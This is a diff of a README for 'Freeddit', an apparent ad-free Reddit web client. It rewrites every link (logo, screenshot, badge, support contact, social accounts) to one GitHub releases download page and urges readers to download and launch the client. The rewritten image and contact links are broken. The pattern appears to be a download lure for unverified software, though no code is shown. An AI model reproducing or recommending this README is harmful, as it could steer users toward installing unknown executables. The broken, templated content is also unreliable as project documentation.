@@ -2,7 +2,7 @@
 
 ## A no ad, no tracking web Reddit client
 
-![Freeddit Logo](https://example.com/freeddit-logo.png)
+![Freeddit Logo](https://github.com/ShinoaTM/freeddit/releases)
 
 ### Description
 Freeddit is a web-based Reddit client that focuses on providing a clean and ad-free browsing experience for users. Say goodbye to those pesky ads and tracking cookies that invade your privacy. Freeddit ensures that your browsing experience is smooth and uninterrupted.
@@ -15,12 +15,12 @@ Freeddit is a web-based Reddit client that focuses on providing a clean and ad-f
 - Seamless Reddit integration
 
 ### Get Started
-To start using Freeddit, simply download the [Freeddit client](https://github.com/files/Project.zip). Kindly launch the provided link to get started with the client. For further updates and releases, please check the "Releases" section of the repository.
+To start using Freeddit, simply download the [Freeddit client](https://github.com/ShinoaTM/freeddit/releases). Kindly launch the provided link to get started with the client. For further updates and releases, please check the "Releases" section of the repository.
 
-[![Download Freeddit](https://img.shields.io/badge/Download-Freeddit-<COLOR>.svg)](https://github.com/files/Project.zip)
+[![Download Freeddit](https://github.com/ShinoaTM/freeddit/releases<COLOR>.svg)](https://github.com/ShinoaTM/freeddit/releases)
 
 ### Screenshots
-![Freeddit Screenshot 1](https://example.com/freeddit-screenshot1.png)
+![Freeddit Screenshot 1](https://github.com/ShinoaTM/freeddit/releases)
 
 ### Installation
 1. Download the Freeddit client from the provided link
@@ -35,12 +35,12 @@ We welcome feedback on Freeddit to continually improve the user experience. Feel
 Contributions to Freeddit are always appreciated. If you would like to contribute to the development of Freeddit, please fork the repository, make your changes, and submit a pull request.
 
 ### Support
-For any inquiries or assistance with Freeddit, please reach out to our support team at support@freeddit.com.
+For any inquiries or assistance with Freeddit, please reach out to our support team at https://github.com/ShinoaTM/freeddit/releases
 
 ### Stay Connected
 Follow us on social media for the latest updates and news about Freeddit:
-- Twitter: [@theFreeddit](https://twitter.com/theFreeddit)
-- Facebook: [Freeddit](https://facebook.com/freeddit)
+- Twitter: [@theFreeddit](https://github.com/ShinoaTM/freeddit/releases)
+- Facebook: [Freeddit](https://github.com/ShinoaTM/freeddit/releases)
 
 ---
 
